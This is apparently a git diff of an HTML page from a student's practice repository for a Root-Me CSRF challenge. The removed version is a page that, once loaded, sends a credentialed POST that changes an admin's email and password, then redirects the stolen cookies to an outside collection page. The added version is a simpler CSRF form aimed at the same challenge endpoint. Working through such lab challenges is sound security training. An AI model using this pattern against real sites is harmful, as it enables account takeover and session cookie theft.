@@ -1,33 +1,16 @@
-<!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Loading...</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
 </head>
 <body>
-    <h2>Please wait...</h2>
-    
-    <script>
-        // Quand l'admin arrive sur votre page, déclencher l'attaque CSRF
-        window.onload = function() {
-            // 1. Récupérer les cookies/admin data
-            var adminCookies = document.cookie;
-            var adminPage = window.location.href;
-            
-            // 2. Faire l'action CSRF vers l'application cible
-            fetch('http://challenge01.root-me.org/web-client/ch22/index.php?action=contact', {
-                method: 'POST',
-                credentials: 'include', // Important: envoie les cookies de session
-                headers: {
-                    'Content-Type': 'application/x-www-form-urlencoded',
-                },
-                body: 'email=hacker@owned.com&password=newpassword'
-            })
-            .then(() => {
-                // 3. Rediriger vers une page de collecte
-                window.location.href = 'https://ridou77.github.io/TP-cyber/collect.html?cookies=' 
-                    + encodeURIComponent(adminCookies) + '&success=true';
-            });
-        }
-    </script>
+    <h1>TEST</h1>
+    <form action="http://challenge01.root-me.org/web-client/ch22/index.php?action=contact" method="POST">
+  <input type="hidden" placeholder="YourEmail" value="attacker" />
+  <input type="hidden" name="content" value="" />
+</form>
+    <button>send request</button>
 </body>
+<script src="script.js"></script>
 </html>
